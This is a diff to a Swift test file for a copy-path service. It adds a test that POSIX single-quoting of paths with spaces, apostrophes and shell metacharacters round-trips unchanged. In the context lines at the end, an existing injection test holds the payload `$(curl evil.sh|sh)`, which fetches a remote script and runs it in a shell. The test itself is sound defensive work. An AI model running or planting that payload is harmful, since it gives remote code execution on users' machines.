@@ -12,14 +12,50 @@ public struct CopyPathTests {
         testRelativePath(baseDir: baseDir, targetFile: targetFile)
         testCopy(targetFile: targetFile)
         testShellInjectionPayloadsNeutralized()
+        testPosixSingleQuotedCdCommand()
     }
 
-    /// Regression coverage for the IntegratedTerminalView shell-injection fix: both `cd "<path>"`
-    /// call sites now route the path through `escapeForTerminal` before interpolating it into a
-    /// double-quoted shell string. The PTY send sites themselves aren't unit-testable (they need
-    /// a live SwiftTerm/NSViewRepresentable), but the actual security property — that
-    /// `escapeForTerminal` neutralizes command-injection payloads when embedded in `cd "..."` —
-    /// is fully testable here.
+    /// H5 regression: `IntegratedTerminalView` now emits `cd \(posixSingleQuoted(path))`, not
+    /// `cd "\(escapeForTerminal(path))"`. The old form double-handled a path with a space
+    /// (`cd "/a/my\ dir"` → zsh tries to enter `my\ dir` with a literal backslash and fails).
+    /// `posixSingleQuoted` must round-trip any path — spaces, metacharacters, embedded apostrophes —
+    /// to exactly itself under single-quote parsing, with no stray backslash escaping.
+    private static func testPosixSingleQuotedCdCommand() {
+        let cases = [
+            "/Users/test/Application Support/My Project",
+            "/Users/test/O'Brien's Files",
+            "/tmp/a&b;c|d$e `x` <y>",
+            "/plain/path"
+        ]
+        for path in cases {
+            let command = "cd \(CopyPathService.posixSingleQuoted(path))"
+            let recovered = unwrapSingleQuoted(String(command.dropFirst("cd ".count)))
+            TestReporter.report(
+                "CopyPath",
+                "POS: posixSingleQuoted round-trips \(path) through `cd '...'` unchanged",
+                result: recovered == path)
+        }
+
+        // The space must NOT also be backslash-escaped inside the quotes (that was the H5 bug).
+        let spaced = CopyPathService.posixSingleQuoted("/a/my dir")
+        TestReporter.report(
+            "CopyPath",
+            "NEG: posixSingleQuoted does not backslash-escape a space",
+            result: spaced == "'/a/my dir'")
+    }
+
+    /// Minimal POSIX single-quote parser: strips the outer `'...'` and turns each `'\''` sequence
+    /// back into a literal `'`, exactly as a shell would.
+    private static func unwrapSingleQuoted(_ token: String) -> String {
+        guard token.hasPrefix("'"), token.hasSuffix("'"), token.count >= 2 else { return token }
+        let inner = String(token.dropFirst().dropLast())
+        return inner.replacingOccurrences(of: "'\\''", with: "'")
+    }
+
+    /// Regression coverage for the `.terminalEscaped` copy variant: a path copied for pasting as an
+    /// **unquoted** shell token routes through `escapeForTerminal`. The property under test — that
+    /// `escapeForTerminal` neutralizes command-injection payloads when embedded in `cd "..."` — is
+    /// fully testable here.
     private static func testShellInjectionPayloadsNeutralized() {
         // Command substitution via $(...)
         let cmdSubst = "$(curl evil.sh|sh)"
